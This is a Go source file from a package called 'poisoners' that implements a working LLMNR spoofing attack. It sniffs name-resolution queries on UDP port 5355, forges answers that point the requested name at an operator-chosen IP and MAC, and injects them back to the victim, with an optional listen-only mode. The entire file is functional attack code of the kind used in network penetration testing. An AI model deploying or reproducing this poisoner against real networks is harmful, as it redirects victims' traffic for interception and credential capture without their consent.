package poisoners

import (
	"log"
	"net"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

const (
	bpfLLMNRFilter string = "(udp and dst port 5355)"
)

var (
	LLMNR_Ans = [][]uint8{
		[]byte{},                       // TID
		[]byte{0x80, 0x00},             // Flags
		[]byte{0x00, 0x01},             // Question
		[]byte{0x00, 0x01},             // AnswerRRS
		[]byte{0x00, 0x00},             // AuthorityRSS
		[]byte{0x00, 0x00},             // AdditionalRRS
		[]byte{},                       // QuestionNameLen
		[]byte{},                       // QuestionName
		[]byte{0x00},                   // QuestionNameNull
		[]byte{0x00, 0x01},             // Type
		[]byte{0x00, 0x01},             // Class (01 is IPv4 and 1c is IPv6)
		[]byte{},                       // AnswerNameLen
		[]byte{},                       // AnswerName
		[]byte{0x00},                   // AnswerNameNull
		[]byte{0x00, 0x01},             // Type1
		[]byte{0x00, 0x01},             // Class1 (01 is IPv4 and 1c is IPv6)
		[]byte{0x00, 0x00, 0x00, 0x1e}, // TTL - Poison for 30sec
		[]byte{0x00, 0x04},             // IPLen
		[]byte{},                       // IP (4 bytes)
	}

	LLMNR_Ans6 = [][]uint8{
		[]byte{},                       // TID
		[]byte{0x80, 0x00},             // Flags
		[]byte{0x00, 0x01},             // Question
		[]byte{0x00, 0x01},             // AnswerRRS
		[]byte{0x00, 0x00},             // AuthorityRSS
		[]byte{0x00, 0x00},             // AdditionalRRS
		[]byte{},                       // QuestionNameLen
		[]byte{},                       // QuestionName
		[]byte{0x00},                   // QuestionNameNull
		[]byte{0x00, 0x1c},             // Type
		[]byte{0x00, 0x01},             // Class
		[]byte{},                       // AnswerNameLen
		[]byte{},                       // AnswerName
		[]byte{0x00},                   // AnswerNameNull
		[]byte{0x00, 0x1c},             // Type1
		[]byte{0x00, 0x01},             // Class1
		[]byte{0x00, 0x00, 0x00, 0x1e}, // TTL - Poison for 30sec
		[]byte{0x00, 0x10},             // IPLen
		[]byte{},                       // IP (16 bytes)
	}

	mainLLMNRDetails sendInfo
)

func sendLLMNRPacket(pdetails packetDetails, payload []byte) {
	// Setup options
	options := gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths:       true,
	}

	buffer := gopacket.NewSerializeBuffer()

	// Build the packetpacket
	ipLayer := &layers.IPv4{
		SrcIP:    pdetails.dstIP,
		DstIP:    pdetails.srcIP,
		Version:  4,
		Flags:    layers.IPv4DontFragment,
		TTL:      64,
		Protocol: layers.IPProtocolUDP,
		IHL:      5,
	}
	ethernetLayer := &layers.Ethernet{
		SrcMAC:       pdetails.dstMAC,
		DstMAC:       pdetails.srcMAC,
		EthernetType: layers.EthernetTypeIPv4,
	}
	udpLayer := &layers.UDP{
		SrcPort: pdetails.dstPort,
		DstPort: pdetails.srcPort,
	}
	udpLayer.SetNetworkLayerForChecksum(ipLayer)

	// And create the packet with the layers
	buffer = gopacket.NewSerializeBuffer()
	gopacket.SerializeLayers(buffer, options,
		ethernetLayer,
		ipLayer,
		udpLayer,
		gopacket.Payload(payload),
	)
	outgoingPacket := buffer.Bytes()

	// Send our packet and don't worry if there is an error
	_ = mainLLMNRDetails.handle.WritePacketData(outgoingPacket)
	log.Printf("[LLMNR] Poisoned answer sent to %s for name %s\n", pdetails.srcIP, pdetails.requestName)
}

func createLLMNRResponsePayload(pdetails packetDetails) []byte {
	payload := []byte{}
	res := LLMNR_Ans

	// Check if IPv6
	if pdetails.ipType == 6 {
		res = LLMNR_Ans6
	}

	// Set TID (0)
	res[0] = pdetails.transactionID

	// Set QuestionNameLen (6)
	l := uint8(len(pdetails.requestName))
	temp := []byte{}
	res[6] = append(temp, l)

	// Set QuestionName (7)
	res[7] = pdetails.requestName

	// Set AnswerNameLen (11)
	res[11] = res[6]

	// Set AnswerName (12)
	res[12] = res[7]

	// Set IPv4 (18)
	res[18] = pdetails.dstIP

	for _, v := range res {
		for _, b := range v {
			payload = append(payload, byte(b))
		}
	}

	return payload
}

func parseLLMNRPacket(packet gopacket.Packet) packetDetails {
	var details packetDetails

	// Since we are only responding with IPv4 addresses
	// We dont care if the request was via IPv4 or 6
	details.dstIP = mainLLMNRDetails.respondIP

	ip6Layer := packet.Layer(layers.LayerTypeIPv6)
	if ip6Layer != nil {
		details.ipType = 6
		ip, _ := ip6Layer.(*layers.IPv6)
		details.srcIP = ip.SrcIP
	}

	ipLayer := packet.Layer(layers.LayerTypeIPv4)
	if ipLayer != nil {
		details.ipType = 4
		ip, _ := ipLayer.(*layers.IPv4)
		details.srcIP = ip.SrcIP
	}

	// Get Ethernet layer
	ethLayer := packet.Layer(layers.LayerTypeEthernet)
	if ethLayer != nil {
		eth, _ := ethLayer.(*layers.Ethernet)
		details.srcMAC = eth.SrcMAC
		details.dstMAC = mainLLMNRDetails.respondMAC
	}

	// Get UDP layer
	udpLayer := packet.Layer(layers.LayerTypeUDP)
	if udpLayer != nil {
		udp, _ := udpLayer.(*layers.UDP)
		details.srcPort = udp.SrcPort
		details.dstPort = udp.DstPort

		// Get transaction ID
		details.transactionID = udp.Payload[:2]

		// Get query name
		nameLength := udp.Payload[12]
		details.requestName = udp.Payload[13 : 13+nameLength]
	}

	return details
}

// Capture only LLMNR packets
func filter_LLMNR(pcapHandle *pcap.Handle) {
	// Set filter for LLMNR broadcast
	err := pcapHandle.SetBPFFilter(bpfLLMNRFilter)
	if err != nil {
		log.Fatal(err)
	}

	// set packet source
	packetSource := gopacket.NewPacketSource(pcapHandle, pcapHandle.LinkType())

	// Process packets
	for packet := range packetSource.Packets() {
		// Parse the details of the packet
		pd := parseLLMNRPacket(packet)
		log.Printf("[LLMNR] Request by %s for %s\n", pd.srcIP, pd.requestName)

		// If analyze is false, then we will poison
		if !mainLLMNRDetails.analyze {
			// Create new response packet
			response := createLLMNRResponsePayload(pd)

			// FIX ME
			// Sent response packet only to IPv4 for now
			if pd.ipType == 4 {
				sendLLMNRPacket(pd, response)
			}
		}
	}
}

func StartLLMNR(pcapHandle *pcap.Handle, ip net.IP, mac net.HardwareAddr, analyze bool) {

	// Setup the main details with
	// handle, analyze, IP and MAC we want to respond with
	mainLLMNRDetails = sendInfo{handle: pcapHandle, respondIP: ip, respondMAC: mac, analyze: analyze}

	// Start poinson/filtering packets
	filter_LLMNR(pcapHandle)
}
